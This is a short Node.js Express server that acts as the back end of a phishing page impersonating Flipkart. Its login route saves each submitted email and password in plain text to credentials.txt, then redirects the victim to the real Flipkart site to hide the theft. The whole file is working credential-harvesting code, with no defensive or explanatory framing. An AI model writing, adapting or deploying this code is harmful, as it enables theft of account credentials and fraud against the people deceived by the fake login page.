const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

// POST route to handle form
app.post('/login', (req, res) => {
  const { email, password } = req.body;
  const entry = `Email: ${email}, Password: ${password}\n`;

  // Save data to file
  fs.appendFile('credentials.txt', entry, (err) => {
    if (err) {
      console.error('Error saving credentials:', err);
    } else {
      console.log('Credentials saved.');
    }
  });

  // Redirect to real Flipkart
  res.redirect('https://www.flipkart.com');
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
